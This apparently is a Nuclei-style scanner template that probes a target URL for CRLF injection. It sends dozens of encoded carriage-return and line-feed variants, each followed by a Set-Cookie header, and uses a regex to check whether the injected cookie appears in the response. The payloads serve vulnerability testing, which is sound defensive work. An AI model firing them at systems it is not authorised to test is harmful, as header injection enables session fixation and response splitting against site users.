id: crlf-fuzzing

info:
  name: CRLF injection fuzzing
  author: melbadry9 & xelkomy
  severity: low
  description: Improper sanitization of CRLF sequences

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?crlf=%00Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%0aSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%0dSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%0d%09Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%0d%0aSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%0d%0a%09Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%0d%0a%20Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%0d%20Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%20Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%23%0aSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%23%0a%20Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%23%0dSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%23%0d%0aSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%3fSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%3f%0aSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%3f%0dSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%3f%0d%0aSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%e5%98%8a%e5%98%8dSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8dSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=\\rSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=\\r%20Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=\\r\\nSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/crlf=\\r\\n%20?Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=\\r\\n\\tSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/?crlf=\\r\\tSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%00Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%0aSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%0dSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%0d%09Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%0d%0aSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%0d%0a%09Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%0d%0a%20Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%0d%20Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%20Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%23%0aSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%23%0a%20Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%23%0dSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%23%0d%0aSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%3fSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%3f%0aSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%3f%0dSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%3f%0d%0aSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%e5%98%8a%e5%98%8dSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8dSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/\\rSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/\\r%20Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/\\r\\nSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/\\r\\n%20Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/\\r\\n\\tSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/\\r\\tSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%e5%98%8a%e5%98%8dSet-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%00#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%0a#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%0d#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%0d%09#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%0d%0a#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%0d%0a%09#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%0d%0a%20#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%0d%20#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%20#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%23%0a#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%23%0a%20#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%23%0d#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%23%0d%0a#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%3f#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%3f%0a#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%3f%0d#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%3f%0d%0a#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%e5%98%8a%e5%98%8d#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/\\r#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/\\r%20#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/\\r\\n#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/\\r\\n%20#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/\\r\\n\\t#Set-Cookie:crlfinjection=crlfinjection"
      - "{{BaseURL}}/\\r\\t#Set-Cookie:crlfinjection=crlfinjection"
    
    threads: 20
    matchers:
      - type: regex
        regex:
          - '(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)'
        part: header
